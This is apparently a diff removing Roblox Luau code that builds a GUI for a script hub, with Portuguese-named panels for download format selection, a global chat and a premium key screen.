-RelevanciaTexto.Parent = Relevancia
-DataUploadTexto = Instance.new("TextLabel")
-DataUploadTexto.Size = UDim2.new(0, 178, 1, 0)
-DataUploadTexto.Position = UDim2.new(0, 39, 0, 0)
-DataUploadTexto.BackgroundTransparency = 1
-DataUploadTexto.Text = Traducao.UploaDate .. "\n" .. Traducao.Any
-DataUploadTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-DataUploadTexto.Font = Enum.Font.SourceSansBold
-DataUploadTexto.TextScaled = true
-DataUploadTexto.Parent = DataUpload
-DuracaoTexto = Instance.new("TextLabel")
-DuracaoTexto.Size = UDim2.new(0, 178, 1, 0)
-DuracaoTexto.Position = UDim2.new(0, 39, 0, 0)
-DuracaoTexto.BackgroundTransparency = 1
-DuracaoTexto.Text = Traducao.Duration .. "\n" .. Traducao.Any
-DuracaoTexto.TextColor3 = Color3.fromRGB(255, 255, 255)
-DuracaoTexto.Font = Enum.Font.SourceSansBold
-DuracaoTexto.TextScaled = true
-DuracaoTexto.Parent = Duracao
-AplicarFiltro = Instance.new("ImageButton")
-AplicarFiltro.Size = UDim2.new(0, 100, 0, 35)
-AplicarFiltro.Position = UDim2.new(0, 7, 0, 145)
-AplicarFiltro.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-AplicarFiltro.BackgroundTransparency = 0.9
-AplicarFiltro.BorderSizePixel = 0
-AplicarFiltro.AutoButtonColor = false
-AplicarFiltro.Parent = ScrollFiltro
-RemoverFiltro = Instance.new("ImageButton")
-RemoverFiltro.Size = UDim2.new(0, 100, 0, 35)
-RemoverFiltro.Position = UDim2.new(0, 128, 0, 145)
-RemoverFiltro.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-RemoverFiltro.BackgroundTransparency = 0.9
-RemoverFiltro.BorderSizePixel = 0
-RemoverFiltro.AutoButtonColor = false
-RemoverFiltro.Parent = ScrollFiltro
-NomeAplicarFiltro = Instance.new("TextLabel")
-NomeAplicarFiltro.Size = UDim2.new(1, -8, 1, -8)
-NomeAplicarFiltro.Position = UDim2.new(0, 4, 0, 4)
-NomeAplicarFiltro.BackgroundTransparency = 1
-NomeAplicarFiltro.Text = Traducao.AplicarF
-NomeAplicarFiltro.TextColor3 = Color3.fromRGB(20, 20, 20)
-NomeAplicarFiltro.Font = Enum.Font.SourceSansBold
-NomeAplicarFiltro.TextScaled = true
-NomeAplicarFiltro.Parent = AplicarFiltro
-NomeRemoverFiltro = Instance.new("TextLabel")
-NomeRemoverFiltro.Size = UDim2.new(1, -8, 1, -8)
-NomeRemoverFiltro.Position = UDim2.new(0, 4, 0, 4)
-NomeRemoverFiltro.BackgroundTransparency = 1
-NomeRemoverFiltro.Text = Traducao.RemoverF
-NomeRemoverFiltro.TextColor3 = Color3.fromRGB(20, 20, 20)
-NomeRemoverFiltro.Font = Enum.Font.SourceSansBold
-NomeRemoverFiltro.TextScaled = true
-NomeRemoverFiltro.Parent = RemoverFiltro
-Formato = Instance.new("Frame")
-Formato.Size = UDim2.new(1, 0, 1, 0)
-Formato.Position = UDim2.new(0, 0, 0, 0)
-Formato.BackgroundTransparency = 1
-Formato.BorderSizePixel = 0
-Formato.Visible = false
-Formato.Parent = Resultados
-TituloFormato = Instance.new("TextLabel")
-TituloFormato.Size = UDim2.new(0, 227, 0, 24)
-TituloFormato.Position = UDim2.new(0, 4, 0, 2)
-TituloFormato.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-TituloFormato.TextColor3 = Color3.fromRGB(255, 255, 255)
-TituloFormato.BackgroundTransparency = 0.5
-TituloFormato.BorderSizePixel = 0
-TituloFormato.Text = Traducao.EscolhaFor
-TituloFormato.TextSize = 12
-TituloFormato.Parent = Formato
-Linha = Instance.new("Frame")
-Linha.Size = UDim2.new(1, 0, 0, 2)
-Linha.Position = UDim2.new(0, 0, 0, 30)
-Linha.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-Linha.BorderSizePixel = 0
-Linha.Parent = Formato
-Thumbfor = Instance.new("ImageLabel")
-Thumbfor.Size = UDim2.new(0, 85, 0, 50)
-Thumbfor.Position = UDim2.new(0, 7, 0, 39)
-Thumbfor.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Thumbfor.Image = "rbxassetid://0"
-Thumbfor.ImageRectOffset = Vector2.new(0, 0)
-Thumbfor.ImageRectSize = Vector2.new(0, 0)
-Thumbfor.Parent = Formato
-Titulofor = Instance.new("Frame")
-Titulofor.Size = UDim2.new(0, 127, 0, 50)
-Titulofor.Position = UDim2.new(0, 101, 0, 39)
-Titulofor.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Titulofor.Parent = Formato
-TextoTituloFor = Instance.new("TextLabel")
-TextoTituloFor.Size = UDim2.new(1, -10, 1, -10)
-TextoTituloFor.Position = UDim2.new(0, 5, 0, 5)
-TextoTituloFor.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-TextoTituloFor.BackgroundTransparency = 1
-TextoTituloFor.BorderSizePixel = 0
-TextoTituloFor.RichText = true
-TextoTituloFor.Text = ""
-TextoTituloFor.TextScaled = true
-TextoTituloFor.Parent = Titulofor
-BotaoMp3 = Instance.new("ImageButton")
-BotaoMp3.Size = UDim2.new(0, 60, 0, 30)
-BotaoMp3.Position = UDim2.new(0, 7, 0, 112)
-BotaoMp3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-BotaoMp3.BackgroundTransparency = 0
-BotaoMp3.AutoButtonColor = true
-BotaoMp3.Parent = Formato
-BotaoMp4 = Instance.new("ImageButton")
-BotaoMp4.Size = UDim2.new(0, 60, 0, 30)
-BotaoMp4.Position = UDim2.new(0, 88, 0, 112)
-BotaoMp4.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-BotaoMp4.BackgroundTransparency = 0.9
-BotaoMp4.AutoButtonColor = false
-BotaoMp4.Parent = Formato
-BotaoCancelar = Instance.new("ImageButton")
-BotaoCancelar.Size = UDim2.new(0, 60, 0, 30)
-BotaoCancelar.Position = UDim2.new(0, 168, 0, 112)
-BotaoCancelar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-BotaoCancelar.Parent = Formato
-NomeMp3 = Instance.new("TextLabel")
-NomeMp3.Size = UDim2.new(1, -8, 1, -8)
-NomeMp3.Position = UDim2.new(0, 4, 0, 4)
-NomeMp3.BackgroundTransparency = 1
-NomeMp3.Text = Traducao.Musica
-NomeMp3.TextColor3 = Color3.fromRGB(0, 191, 255)
-NomeMp3.Font = Enum.Font.SourceSansBold
-NomeMp3.TextScaled = true
-NomeMp3.Parent = BotaoMp3
-NomeMp4 = Instance.new("TextLabel")
-NomeMp4.Size = UDim2.new(1, -8, 1, -8)
-NomeMp4.Position = UDim2.new(0, 4, 0, 4)
-NomeMp4.BackgroundTransparency = 1
-NomeMp4.Text = "Video"
-NomeMp4.TextColor3 = Color3.fromRGB(144, 238, 144)
-NomeMp4.Font = Enum.Font.SourceSansBold
-NomeMp4.TextScaled = true
-NomeMp4.Parent = BotaoMp4
-NomeCancel = Instance.new("TextLabel")
-NomeCancel.Size = UDim2.new(1, -8, 1, -8)
-NomeCancel.Position = UDim2.new(0, 4, 0, 4)
-NomeCancel.BackgroundTransparency = 1
-NomeCancel.Text = Traducao.Cancelar
-NomeCancel.TextColor3 = Color3.fromRGB(178, 55, 34)
-NomeCancel.Font = Enum.Font.SourceSansBold
-NomeCancel.TextScaled = true
-NomeCancel.Parent = BotaoCancelar
-Erro = Instance.new("ImageLabel")
-Erro.Size = UDim2.new(0, 80, 0, 80)
-Erro.AnchorPoint = Vector2.new(0.5, 0.5)
-Erro.Position = UDim2.new(0.5, -3, 0.5, -20)
-Erro.BackgroundTransparency = 1
-Erro.Image = "rbxassetid://80694922314021"
-Erro.Visible = false
-Erro.Parent = Resultados
-Baixando = Instance.new("ImageLabel")
-Baixando.Size = UDim2.new(0, 80, 0, 80)
-Baixando.AnchorPoint = Vector2.new(0.5, 0.5)
-Baixando.Position = UDim2.new(0.5, -3, 0.5, -20)
-Baixando.BackgroundTransparency = 1
-Baixando.Image = "rbxassetid://76931060119037"
-Baixando.Visible = false
-Baixando.Parent = Resultados
-Concluido = Instance.new("ImageLabel")
-Concluido.Size = UDim2.new(0, 77, 0, 77)
-Concluido.AnchorPoint = Vector2.new(0.5, 0.5)
-Concluido.Position = UDim2.new(0.5, -3, 0.5, -20)
-Concluido.BackgroundTransparency = 1
-Concluido.Image = "rbxassetid://135264044346021"
-Concluido.Visible = false
-Concluido.Parent = Resultados
-Tutorial = Instance.new("ImageButton")
-Tutorial.Size = UDim2.new(0, 25, 0, 25)
-Tutorial.Position = UDim2.new(0, 7, 0, 5)
-Tutorial.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Tutorial.BorderSizePixel = 0
-Tutorial.Visible = false
-Tutorial.Parent = Resultados
-TutoTexto = Instance.new("TextLabel")
-TutoTexto.Size = UDim2.new(1, 0, 1, 0)
-TutoTexto.Position = UDim2.new(0, 0, 0, 0)
-TutoTexto.BackgroundTransparency = 1
-TutoTexto.Text = "?"
-TutoTexto.TextColor3 = Color3.fromRGB(188, 11, 35)
-TutoTexto.Font = Enum.Font.SourceSansBold
-TutoTexto.TextScaled = true
-TutoTexto.Parent = Tutorial
-Novamente = Instance.new("ImageButton")
-Novamente.Size = UDim2.new(0, 25, 0, 25)
-Novamente.Position = UDim2.new(0, 203, 0, 5)
-Novamente.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Novamente.BorderSizePixel = 0
-Novamente.Visible = false
-Novamente.Parent = Resultados
-FotoNova = Instance.new("ImageLabel")
-FotoNova.Size = UDim2.new(0, 18, 0, 18)
-FotoNova.Position = UDim2.new(0, 3, 0, 3)
-FotoNova.BackgroundTransparency = 1
-FotoNova.ImageTransparency = 0
-FotoNova.Image = "rbxassetid://95528695645064"
-FotoNova.Parent = Novamente
-ScrollDownload = Instance.new("ScrollingFrame")
-ScrollDownload.Size = UDim2.new(1, -1, 1, 0)
-ScrollDownload.Position = UDim2.new(0, 0, 0, 0)
-ScrollDownload.BackgroundTransparency = 1
-ScrollDownload.BorderSizePixel = 0
-ScrollDownload.ScrollBarThickness = 1
-ScrollDownload.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ScrollDownload.ScrollBarImageTransparency = 0.5
-ScrollDownload.CanvasSize = UDim2.new(0, 0, 0, 0)
-ScrollDownload.CanvasPosition = Vector2.new(0, 0)
-ScrollDownload.ScrollingDirection = Enum.ScrollingDirection.Y
-ScrollDownload.ClipsDescendants = true
-ScrollDownload.Visible = false
-ScrollDownload.Parent = Resultados
-TituloGC = Instance.new("Frame")
-TituloGC.Size = UDim2.new(0, 235, 0, 43)
-TituloGC.Position = UDim2.new(0, 6, 0, 6)
-TituloGC.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-TituloGC.BorderSizePixel = 0
-TituloGC.Parent = Tela5
-NomeGC = Instance.new("TextLabel")
-NomeGC.Size = UDim2.new(1, 0, 1, 0)
-NomeGC.Position = UDim2.new(0, 0, 0, 0)
-NomeGC.BackgroundTransparency = 1
-NomeGC.Text = "Global Chat"
-NomeGC.TextColor3 = Color3.fromRGB(255, 0, 0)
-NomeGC.Font = Enum.Font.SourceSansBold
-NomeGC.TextScaled = true
-NomeGC.Parent = TituloGC
-GCFrame = Instance.new("Frame")
-GCFrame.Size = UDim2.new(0, 235, 0, 187)
-GCFrame.Position = UDim2.new(0, 6, 0, 58)
-GCFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-GCFrame.BorderSizePixel = 0
-GCFrame.Parent = Tela5
-Regras = Instance.new("TextButton")
-Regras.Size = UDim2.new(0, 19, 0, 19)
-Regras.Position = UDim2.new(0, 5, 0, 3)
-Regras.Text = "R"
-Regras.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Regras.TextColor3 = Color3.fromRGB(255, 255, 255)
-Regras.BackgroundTransparency = 0.5
-Regras.Parent = GCFrame
-Linha = Instance.new("Frame")
-Linha.Size = UDim2.new(1, 0, 0, 2)
-Linha.Position = UDim2.new(0, 0, 0, 25)
-Linha.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-Linha.BorderSizePixel = 0
-Linha.Parent = GCFrame
-AvisoGC = Instance.new("TextLabel")
-AvisoGC.Size = UDim2.new(0, 177, 0, 19)
-AvisoGC.Position = UDim2.new(0, 29, 0, 3)
-AvisoGC.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-AvisoGC.BackgroundTransparency = 0.5
-AvisoGC.Text = Traducao.Respeito
-AvisoGC.TextColor3 = Color3.fromRGB(255, 255, 255)
-AvisoGC.Font = Enum.Font.SourceSansBold
-AvisoGC.TextScaled = true
-AvisoGC.Visible = true
-AvisoGC.Parent = GCFrame
-padding = Instance.new("UIPadding")
-padding.PaddingLeft = UDim.new(0, 3)
-padding.PaddingRight = UDim.new(0, 3)
-padding.PaddingTop = UDim.new(0, 3)
-padding.PaddingBottom = UDim.new(0, 3)
-padding.Parent = AvisoGC
-NotificarGC = Instance.new("ImageButton")
-NotificarGC.Size = UDim2.new(0, 19, 0, 19)
-NotificarGC.Position = UDim2.new(0, 211, 0, 3)
-NotificarGC.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-NotificarGC.BackgroundTransparency = 0.5
-NotificarGC.Parent = GCFrame
-Sino = Instance.new("ImageLabel")
-Sino.Size = UDim2.new(0, 17, 0, 16)
-Sino.Position = UDim2.new(0, 1, 0, 1)
-Sino.Image = "rbxassetid://115374069603142"
-Sino.BackgroundTransparency = 1
-Sino.Parent = NotificarGC
-EsperandoIMG = Instance.new("ImageLabel")
-EsperandoIMG.Size = UDim2.new(0, 90, 0, 90)
-EsperandoIMG.AnchorPoint = Vector2.new(0.5, 0.5)
-EsperandoIMG.Position = UDim2.new(0.5, -3, 0.5, -5)
-EsperandoIMG.BackgroundTransparency = 1
-EsperandoIMG.Image = "rbxassetid://18836713445"
-EsperandoIMG.Visible = true
-EsperandoIMG.Parent = GCFrame
-BaseFinalGC = Instance.new("Frame")
-BaseFinalGC.Size = UDim2.new(0, 40, 0, 40)
-BaseFinalGC.AnchorPoint = Vector2.new(0.5, 0.5)
-BaseFinalGC.Position = UDim2.new(0.5, 0, 0.5, 26)
-BaseFinalGC.BorderSizePixel = 0
-BaseFinalGC.BackgroundTransparency = 1
-BaseFinalGC.ZIndex = 2
-BaseFinalGC.ClipsDescendants = true
-BaseFinalGC.Parent = GCFrame
-FinalGC = Instance.new("ImageButton")
-FinalGC.Size = UDim2.new(0, 32, 0, 32)
-FinalGC.Position = UDim2.new(0, 4, 1, 4)
-FinalGC.ZIndex = 2
-FinalGC.Image = "rbxassetid://128357204583758"
-FinalGC.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-FinalGC.Parent = BaseFinalGC
-ScrollGC = Instance.new("ScrollingFrame")
-ScrollGC.Size = UDim2.new(1, -2, 1, -73)
-ScrollGC.Position = UDim2.new(0, 1, 0, 28)
-ScrollGC.BackgroundTransparency = 1
-ScrollGC.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ScrollGC.ScrollBarImageTransparency = 0.5
-ScrollGC.BorderSizePixel = 0
-ScrollGC.ScrollBarThickness = 1
-ScrollGC.CanvasSize = UDim2.new(0, 0, 0, 0)
-ScrollGC.CanvasPosition = Vector2.new(0, 0)
-ScrollGC.ScrollingDirection = Enum.ScrollingDirection.Y
-ScrollGC.ClipsDescendants = true
-ScrollGC.Visible = false
-ScrollGC.AutomaticCanvasSize = Enum.AutomaticSize.Y
-ScrollGC.Parent = GCFrame
-paddinggc = Instance.new("UIPadding")
-paddinggc.PaddingLeft = UDim.new(0, 5)
-paddinggc.PaddingRight = UDim.new(0, 5)
-paddinggc.PaddingTop = UDim.new(0, 5)
-paddinggc.PaddingBottom = UDim.new(0, 5)
-paddinggc.Parent = ScrollGC
-layoutgc = Instance.new("UIListLayout")
-layoutgc.Parent = ScrollGC
-layoutgc.SortOrder = Enum.SortOrder.LayoutOrder
-layoutgc.Padding = UDim.new(0, 9)
-Linha2 = Instance.new("Frame")
-Linha2.Size = UDim2.new(1, 0, 0, 2)
-Linha2.Position = UDim2.new(0, 0, 0, 143)
-Linha2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-Linha2.BorderSizePixel = 0
-Linha2.Parent = GCFrame
-MsgFrame = Instance.new("Frame")
-MsgFrame.Size = UDim2.new(0, 223, 0, 32)
-MsgFrame.Position = UDim2.new(0, 6, 0, 150)
-MsgFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-MsgFrame.BorderSizePixel = 0
-MsgFrame.Parent = GCFrame
-MsgErroGC = Instance.new("TextLabel")
-MsgErroGC.Size = UDim2.new(0, 215, 0, 28)
-MsgErroGC.Position = UDim2.new(0, 4, 0, 2)
-MsgErroGC.Text = Traducao.GcKey
-MsgErroGC.TextScaled = true
-MsgErroGC.TextColor3 = Color3.fromRGB(220, 220, 220)
-MsgErroGC.BackgroundTransparency = 1
-MsgErroGC.Visible = true
-MsgErroGC.Parent = MsgFrame
-Traduzir = Instance.new("ImageButton")
-Traduzir.Size = UDim2.new(0, 24, 0, 24)
-Traduzir.Position = UDim2.new(0, 4, 0, 4)
-Traduzir.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-Traduzir.Visible = false
-Traduzir.Parent = MsgFrame
-FotoTradu = Instance.new("ImageLabel")
-FotoTradu.Size = UDim2.new(0, 18, 0, 18)
-FotoTradu.Position = UDim2.new(0, 3, 0, 3)
-FotoTradu.BackgroundTransparency = 1
-FotoTradu.ImageTransparency = 0
-FotoTradu.Image = "rbxassetid://84867288877251"
-FotoTradu.Parent = Traduzir
-LinhaTraducao = Instance.new("Frame")
-LinhaTraducao.Size = UDim2.new(0, 1, 1, 0)
-LinhaTraducao.Position = UDim2.new(0, 32, 0, 0)
-LinhaTraducao.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-LinhaTraducao.BorderSizePixel = 0
-LinhaTraducao.Visible = false
-LinhaTraducao.Parent = MsgFrame
-GCBox = Instance.new("TextBox")
-GCBox.Size = UDim2.new(0, 151, 0, 28)
-GCBox.Position = UDim2.new(0, 36, 0, 2)
-GCBox.Text = ""
-GCBox.ClearTextOnFocus = false
-GCBox.PlaceholderText = Traducao.EnvieGc
-GCBox.TextScaled = true
-GCBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-GCBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
-GCBox.BackgroundTransparency = 1
-GCBox.Active = false
-GCBox.Visible = false
-GCBox.Parent = MsgFrame
-SendGC = Instance.new("ImageButton")
-SendGC.Size = UDim2.new(0, 32, 0, 32)
-SendGC.Position = UDim2.new(0, 191, 0, 0)
-SendGC.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-SendGC.Visible = false
-SendGC.Parent = MsgFrame
-Aviao = Instance.new("ImageLabel")
-Aviao.Size = UDim2.new(0, 24, 0, 24)
-Aviao.Position = UDim2.new(0, 4, 0, 4)
-Aviao.BackgroundTransparency = 1
-Aviao.ImageTransparency = 0
-Aviao.Image = "rbxassetid://111380412941011"
-Aviao.Parent = SendGC
-TituloPremium = Instance.new("Frame")
-TituloPremium.Size = UDim2.new(0, 235, 0, 43)
-TituloPremium.Position = UDim2.new(0, 6, 0, 6)
-TituloPremium.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-TituloPremium.BorderSizePixel = 0
-TituloPremium.Parent = Tela6
-NomePremium = Instance.new("TextLabel")
-NomePremium.Size = UDim2.new(1, 0, 1, 0)
-NomePremium.Position = UDim2.new(0, 0, 0, 0)
-NomePremium.BackgroundTransparency = 1
-NomePremium.Text = "Premium"
-NomePremium.TextColor3 = Color3.fromRGB(255, 255, 0)
-NomePremium.Font = Enum.Font.SourceSansBold
-NomePremium.TextScaled = true
-NomePremium.Parent = TituloPremium
-Privilegios = Instance.new("Frame")
-Privilegios.Size = UDim2.new(0, 235, 0, 100)
-Privilegios.Position = UDim2.new(0, 6, 0, 58)
-Privilegios.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-Privilegios.BorderSizePixel = 0
-Privilegios.Parent = Tela6
-BaseSF = Instance.new("Frame")
-BaseSF.Size = UDim2.new(1, 0, 1, -4)
-BaseSF.Position = UDim2.new(0, 0, 0, 2)
-BaseSF.BackgroundTransparency = 1
-BaseSF.BorderSizePixel = 0
-BaseSF.ClipsDescendants = true
-BaseSF.Visible = true
-BaseSF.Parent = Privilegios
-ScrollPremium = Instance.new("ScrollingFrame")
-ScrollPremium.Size = UDim2.new(1, -2, 1, 0)
-ScrollPremium.Position = UDim2.new(0, 0, 0, 0)
-ScrollPremium.BackgroundTransparency = 1
-ScrollPremium.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ScrollPremium.ScrollBarImageTransparency = 0.5
-ScrollPremium.BorderSizePixel = 0
-ScrollPremium.ScrollBarThickness = 1
-ScrollPremium.CanvasSize = UDim2.new(0, 0, 0, 270)
-ScrollPremium.ScrollingDirection = Enum.ScrollingDirection.Y
-ScrollPremium.ClipsDescendants = false
-ScrollPremium.Parent = BaseSF
-Priv1 = Instance.new("ImageButton")
-Priv1.Size = UDim2.new(0, 221, 0, 35)
-Priv1.Position = UDim2.new(0, 7, 0, 5)
-Priv1.BackgroundColor3 = Color3.fromRGB(46, 139, 87)
-Priv1.AutoButtonColor = false
-Priv1.Parent = ScrollPremium
-Priv2 = Instance.new("ImageButton")
-Priv2.Size = UDim2.new(0, 221, 0, 35)
-Priv2.Position = UDim2.new(0, 7, 0, 50)
-Priv2.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
-Priv2.AutoButtonColor = false
-Priv2.Parent = ScrollPremium
-Priv3 = Instance.new("ImageButton")
-Priv3.Size = UDim2.new(0, 221, 0, 35)
-Priv3.Position = UDim2.new(0, 7, 0, 95)
-Priv3.BackgroundColor3 = Color3.fromRGB(72, 61, 139)
-Priv3.AutoButtonColor = false
-Priv3.Parent = ScrollPremium
-Priv4 = Instance.new("ImageButton")
-Priv4.Size = UDim2.new(0, 221, 0, 35)
-Priv4.Position = UDim2.new(0, 7, 0, 140)
-Priv4.BackgroundColor3 = Color3.fromRGB(178, 34, 34)
-Priv4.AutoButtonColor = false
-Priv4.Parent = ScrollPremium
-Priv5 = Instance.new("ImageButton")
-Priv5.Size = UDim2.new(0, 221, 0, 35)
-Priv5.Position = UDim2.new(0, 7, 0, 185)
-Priv5.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-Priv5.AutoButtonColor = false
-Priv5.Parent = ScrollPremium
-Priv6 = Instance.new("ImageButton")
-Priv6.Size = UDim2.new(0, 221, 0, 35)
-Priv6.Position = UDim2.new(0, 7, 0, 230)
-Priv6.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
-Priv6.AutoButtonColor = false
-Priv6.Parent = ScrollPremium
-IconePriv1 = Instance.new("ImageLabel")
-IconePriv1.Size = UDim2.new(0, 35, 0, 35)
-IconePriv1.Position = UDim2.new(0, 0, 0, 0)
-IconePriv1.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-IconePriv1.Image = "rbxassetid://140605327166526"
-IconePriv1.Parent = Priv1
-IconePriv2 = Instance.new("ImageLabel")
-IconePriv2.Size = UDim2.new(0, 35, 0, 35)
-IconePriv2.Position = UDim2.new(0, 0, 0, 0)
-IconePriv2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-IconePriv2.Image = "rbxassetid://128999640209878"
-IconePriv2.Parent = Priv2
-IconePriv3 = Instance.new("ImageLabel")
-IconePriv3.Size = UDim2.new(0, 35, 0, 35)
-IconePriv3.Position = UDim2.new(0, 0, 0, 0)
-IconePriv3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-IconePriv3.Image = "rbxassetid://126724539196702"
-IconePriv3.Parent = Priv3
-IconePriv4 = Instance.new("ImageLabel")
-IconePriv4.Size = UDim2.new(0, 35, 0, 35)
-IconePriv4.Position = UDim2.new(0, 0, 0, 0)
-IconePriv4.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-IconePriv4.Image = "rbxassetid://77651842919295"
-IconePriv4.Parent = Priv4
-IconePriv5 = Instance.new("ImageLabel")
-IconePriv5.Size = UDim2.new(0, 35, 0, 35)
-IconePriv5.Position = UDim2.new(0, 0, 0, 0)
-IconePriv5.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-IconePriv5.Image = "rbxassetid://129506682254424"
-IconePriv5.Parent = Priv5
-IconePriv6 = Instance.new("ImageLabel")
-IconePriv6.Size = UDim2.new(0, 35, 0, 35)
-IconePriv6.Position = UDim2.new(0, 0, 0, 0)
-IconePriv6.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-IconePriv6.Image = "rbxassetid://135757623745817"
-IconePriv6.Parent = Priv6
-TextoPriv1 = Instance.new("TextLabel")
-TextoPriv1.Size = UDim2.new(0, 160, 1, 0)
-TextoPriv1.Position = UDim2.new(0, 45, 0, 0)
-TextoPriv1.BackgroundTransparency = 1
-TextoPriv1.Text = Traducao.Priv1
-TextoPriv1.TextColor3 = Color3.fromRGB(144, 238, 144)
-TextoPriv1.Font = Enum.Font.SourceSansBold
-TextoPriv1.TextScaled = true
-TextoPriv1.Parent = Priv1
-TextoPriv2 = Instance.new("TextLabel")
-TextoPriv2.Size = UDim2.new(0, 160, 1, 0)
-TextoPriv2.Position = UDim2.new(0, 45, 0, 0)
-TextoPriv2.BackgroundTransparency = 1
-TextoPriv2.Text = Traducao.Priv2
-TextoPriv2.TextColor3 = Color3.fromRGB(173, 216, 230)
-TextoPriv2.Font = Enum.Font.SourceSansBold
-TextoPriv2.TextScaled = true
-TextoPriv2.Parent = Priv2
-TextoPriv3 = Instance.new("TextLabel")
-TextoPriv3.Size = UDim2.new(0, 160, 1, 0)
-TextoPriv3.Position = UDim2.new(0, 45, 0, 0)
-TextoPriv3.BackgroundTransparency = 1
-TextoPriv3.Text = "MiniPlayer"
-TextoPriv3.TextColor3 = Color3.fromRGB(186, 85, 211)
-TextoPriv3.Font = Enum.Font.SourceSansBold
-TextoPriv3.TextScaled = true
-TextoPriv3.Parent = Priv3
-TextoPriv4 = Instance.new("TextLabel")
-TextoPriv4.Size = UDim2.new(0, 160, 1, 0)
-TextoPriv4.Position = UDim2.new(0, 45, 0, 0)
-TextoPriv4.BackgroundTransparency = 1
-TextoPriv4.Text = "Roblox Audio"
-TextoPriv4.TextColor3 = Color3.fromRGB(255, 99, 71)
-TextoPriv4.Font = Enum.Font.SourceSansBold
-TextoPriv4.TextScaled = true
-TextoPriv4.Parent = Priv4
-TextoPriv5 = Instance.new("TextLabel")
-TextoPriv5.Size = UDim2.new(0, 160, 1, 0)
-TextoPriv5.Position = UDim2.new(0, 45, 0, 0)
-TextoPriv5.BackgroundTransparency = 1
-TextoPriv5.Text = "Global Chat"
-TextoPriv5.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextoPriv5.Font = Enum.Font.SourceSansBold
-TextoPriv5.TextScaled = true
-TextoPriv5.Parent = Priv5
-TextoPriv6 = Instance.new("TextLabel")
-TextoPriv6.Size = UDim2.new(0, 160, 1, 0)
-TextoPriv6.Position = UDim2.new(0, 45, 0, 0)
-TextoPriv6.BackgroundTransparency = 1
-TextoPriv6.Text = "Premium UI"
-TextoPriv6.TextColor3 = Color3.fromRGB(139, 69, 19)
-TextoPriv6.Font = Enum.Font.SourceSansBold
-TextoPriv6.TextScaled = true
-TextoPriv6.Parent = Priv6
-local frame2 = Instance.new("Frame")
-frame2.Size = UDim2.new(0, 235, 0, 78)
-frame2.Position = UDim2.new(0, 6, 0, 167)
-frame2.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-frame2.BorderSizePixel = 0
-frame2.Visible = false
-frame2.Parent = Tela6
-IconeKeyOk = Instance.new("ImageLabel")
-IconeKeyOk.Size = UDim2.new(0, 40, 0, 40)
-IconeKeyOk.AnchorPoint = Vector2.new(0.5, 0)
-IconeKeyOk.Position = UDim2.new(0.5, 0, 0, 2)
-IconeKeyOk.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-IconeKeyOk.BackgroundTransparency = 1
-IconeKeyOk.Image = "rbxassetid://132948829118667"
-IconeKeyOk.Parent = frame2
-PremiumOkTexto = Instance.new("TextLabel")
-PremiumOkTexto.Size = UDim2.new(0, 225, 0, 30)
-PremiumOkTexto.Position = UDim2.new(0, 5, 0, 44)
-PremiumOkTexto.RichText = true
-PremiumOkTexto.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.VocePremium .. "</font>\n<font color=\"rgb(192,192,192)\">" .. Traducao.VocePremiumTexto .. "</font>"
-PremiumOkTexto.TextScaled = true
-PremiumOkTexto.Font = Enum.Font.SourceSansBold
-PremiumOkTexto.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-PremiumOkTexto.BackgroundTransparency = 0.5
-PremiumOkTexto.BorderSizePixel = 0
-PremiumOkTexto.Parent = frame2
-KeyFrame = Instance.new("Frame")
-KeyFrame.Size = UDim2.new(0, 235, 0, 43)
-KeyFrame.Position = UDim2.new(0, 6, 0, 167)
-KeyFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-KeyFrame.BorderSizePixel = 0
-KeyFrame.Visible = true
-KeyFrame.Parent = Tela6
-SendKey = Instance.new("ImageButton")
-SendKey.Size = UDim2.new(0, 43, 0, 43)
-SendKey.Position = UDim2.new(0, 0, 0, 0)
-SendKey.BackgroundColor3 = Color3.fromRGB(30, 30, 32)
-SendKey.Parent = KeyFrame
-IconeKey = Instance.new("ImageLabel")
-IconeKey.Size = UDim2.new(0, 30, 0, 30)
-IconeKey.Position = UDim2.new(0, 6, 0, 6)
